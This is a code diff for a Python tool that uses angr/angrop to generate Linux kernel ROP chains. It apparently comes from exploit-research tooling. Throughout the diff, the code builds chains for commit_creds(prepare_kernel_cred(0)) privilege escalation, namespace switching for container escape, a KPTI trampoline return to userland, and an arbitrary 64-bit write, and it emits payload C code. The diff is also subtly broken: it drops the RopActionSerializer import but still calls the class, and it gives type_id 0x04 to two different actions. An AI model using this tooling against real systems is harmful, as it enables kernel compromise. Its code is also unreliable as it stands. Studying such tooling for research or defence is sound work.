@@ -5,17 +5,20 @@ from multiprocessing import Pool
 import pathlib
 import subprocess
 import tempfile
+import sys
+import os
 
 import angr
 import angrop
 from angrop.rop_gadget import RopGadget
 from angr.misc.loggers import CuteFormatter
-from rop_chain import *
 from rop_ret_patcher import patch_vmlinux_return_thunk
 from rop_util import load_symbols, setup_logger
 import gadget_finder
 from gadget_filter import GadgetFilter
-from rop_action_serializer import RopActionSerializer
+
+sys.path.append(os.path.abspath(f"{__file__}/../.."))
+from kpwn_db.data_model.rop_chain import *
 
 BIT_SIZE = 64
 PREPARE_KERNEL_CRED = "prepare_kernel_cred"
@@ -84,7 +87,9 @@ class RopGeneratorAngrop:
         return self._symbol_map[func_name]
 
     def _find_symbol(self, func_name):
-        return RopChainOffset(self._find_symbol_addr(func_name) - KERNEL_BASE_ADDRESS)
+        return RopChainOffset(
+          kernel_offset=self._find_symbol_addr(func_name) - KERNEL_BASE_ADDRESS,
+          description=f"{func_name}()")
 
     def _find_symbol_name(self, addr):
         return self._addr_to_symbol.get(addr)
@@ -135,7 +140,8 @@ class RopGeneratorAngrop:
                     shortest_gadget = gadget
 
         if shortest_gadget:
-            return shortest_gadget.addr - KERNEL_BASE_ADDRESS
+            offs = shortest_gadget.addr - KERNEL_BASE_ADDRESS
+            return RopChainOffset(kernel_offset=offs, description=f"pop {reg_name}")
         else:
             raise RopGeneratorError(
                 f"No pop gadget found for the register {reg_name}"
@@ -146,7 +152,9 @@ class RopGeneratorAngrop:
         items = []
         for value, rebased in chain_mov_regs._concretize_chain_values():  # pylint: disable=protected-access
             if rebased:
-                items.append(RopChainOffset(value - KERNEL_BASE_ADDRESS))
+                items.append(RopChainOffset(
+                  kernel_offset=value - KERNEL_BASE_ADDRESS,
+                  description=f"mov {reg_name}, rax"))
             else:
                 items.append(RopChainConstant(value))
 
@@ -295,8 +303,11 @@ class RopGeneratorAngrop:
         Returns:
             RopChain: The constructed ROP chain to execute the `msleep` function.
         """
-        return RopChain([
-            RopChainOffset(self._find_pop_one_reg("rdi")),
+        return RopAction(
+          type_id=0x01,
+          description="msleep(ARG_time_msec)",
+          gadgets=[
+            self._find_pop_one_reg("rdi"),
             msecs,
             self._find_symbol(MSLEEP),
         ])
@@ -308,7 +319,7 @@ class RopGeneratorAngrop:
             RopChain: The constructed ROP chain.
         """
         items = [
-            RopChainOffset(self._find_pop_one_reg("rdi")),
+            self._find_pop_one_reg("rdi"),
             RopChainConstant(0),
             self._find_symbol(PREPARE_KERNEL_CRED),
         ]
@@ -316,7 +327,10 @@ class RopGeneratorAngrop:
         items.extend(self._mov_reg_rax("rdi"))
         items.append(self._find_symbol(COMMIT_KERNEL_CRED))
 
-        return RopChain(items)
+        return RopAction(
+          type_id=0x02,
+          description="commit_kernel_cred(prepare_kernel_cred(0))",
+          gadgets=items)
 
     def rop_action_switch_task_namespaces(self, vpid: RopChainConstant | RopChainArgument):
         """Constructs a ROP action to call fswitch_task_namespaces.
@@ -325,19 +339,22 @@ class RopGeneratorAngrop:
             RopChain: The constructed ROP chain.
         """
         items = [
-            RopChainOffset(self._find_pop_one_reg("rdi")),
+            self._find_pop_one_reg("rdi"),
             vpid,
             self._find_symbol(FIND_TASK_BY_VPID),
         ]
 
         items.extend(self._mov_reg_rax("rdi"))
         items.extend([
-            RopChainOffset(self._find_pop_one_reg("rsi")),
+            self._find_pop_one_reg("rsi"),
             self._find_symbol(INIT_NSPROXY),
         ])
         items.append(self._find_symbol(SWITCH_TASK_NAMESPACES))
 
-        return RopChain(items)
+        return RopAction(
+          type_id=0x04,
+          description="switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)",
+          gadgets=items)
 
     def rop_action_ret_via_kpti_retpoline(
         self,
@@ -352,8 +369,13 @@ class RopGeneratorAngrop:
         Returns:
             RopChain: The constructed ROP chain.
         """
-        return RopChain([
-            RopChainOffset(self._kpti_trampoline - KERNEL_BASE_ADDRESS),
+        return RopAction(
+          type_id=0x07,
+          description="ret_via_kpti_retpoline(ARG_user_rip, ARG_user_cs, ARG_user_rflags, ARG_user_sp, ARG_user_ss)",
+          gadgets=[
+            RopChainOffset(
+              kernel_offset=self._kpti_trampoline - KERNEL_BASE_ADDRESS,
+              description="kpti_trampoline()"),
             RopChainConstant(0),
             RopChainConstant(0),
             user_rip,
@@ -369,7 +391,10 @@ class RopGeneratorAngrop:
         Returns:
             RopChain: The constructed ROP chain.
         """
-        return RopChain([self._find_symbol(FORK)])
+        return RopAction(
+          type_id=0x05,
+          description="fork()",
+          gadgets=[self._find_symbol(FORK)])
 
     def rop_action_telefork(self, msecs: RopChainConstant | RopChainArgument):
         """Constructs a telefork rop chain.
@@ -379,12 +404,15 @@ class RopGeneratorAngrop:
             RopChain: The constructed ROP chain.
         """
         items = [self._find_symbol(FORK),
-                 RopChainOffset(self._find_pop_one_reg("rdi")),
+                 self._find_pop_one_reg("rdi"),
                  msecs,
                  self._find_symbol(MSLEEP),
                 ]
 
-        return RopChain(items)
+        return RopAction(
+          type_id=0x06,
+          description="telefork(ARG_time_msec=5000)",
+          gadgets=items)
 
     def rop_action_write_what_where_64(self, address, value):
         """Constructs a rop chain to write a 64 bit value to an address.
@@ -392,13 +420,18 @@ class RopGeneratorAngrop:
         Returns:
            RopChain: The constructed ROP chain.
         """
-        items = [RopChainOffset(self._find_pop_one_reg("rdi")),
+        items = [self._find_pop_one_reg("rdi"),
                  address,
-                 RopChainOffset(self._find_pop_one_reg("rsi")),
+                 self._find_pop_one_reg("rsi"),
                  value,
-                 RopChainOffset(self.find_memory_write())]
+                 RopChainOffset(
+                   kernel_offset=self.find_memory_write(),
+                   description="mov qword ptr [rdi], rsi")]
 
-        return RopChain(items)
+        return RopAction(
+          type_id=0x04,
+          description="write_what_where_64(ARG_address, ARG_new_value)",
+          gadgets=items)
 
 
 if __name__ == "__main__":
@@ -425,19 +458,20 @@ if __name__ == "__main__":
         RopChainArgument(0), RopChainArgument(1))
     action_fork = rop_generator.rop_action_fork()
     action_telefork = rop_generator.rop_action_telefork(RopChainArgument(0))
-    action_trampoline_ret = rop_generator.rop_action_ret_via_kpti_retpoline(RopChainArgument(
-        0), RopChainArgument(1), RopChainArgument(2), RopChainArgument(3), RopChainArgument(4))
+    action_trampoline_ret = rop_generator.rop_action_ret_via_kpti_retpoline(
+      RopChainArgument(0), RopChainArgument(1), RopChainArgument(2),
+      RopChainArgument(3), RopChainArgument(4))
 
     if args.output == "json":
-        print(RopActionSerializer.serialize({
-            0x01: action_sleep,
-            0x02: action_commit_creds,
-            0x03: action_switch_task_namespace,
-            0x04: action_write_what_where_64,
-            0x05: action_fork,
-            0x06: action_telefork,
-            0x07: action_trampoline_ret,
-        }, args.json_indent))
+        print(RopActionSerializer.serialize([
+            action_sleep,
+            action_commit_creds,
+            action_switch_task_namespace,
+            action_write_what_where_64,
+            action_fork,
+            action_telefork,
+            action_trampoline_ret,
+        ], args.json_indent))
     else:
         chain = rop_generator.build_rop_chain()
         payload_code = rop_generator.payload_c_code(chain)
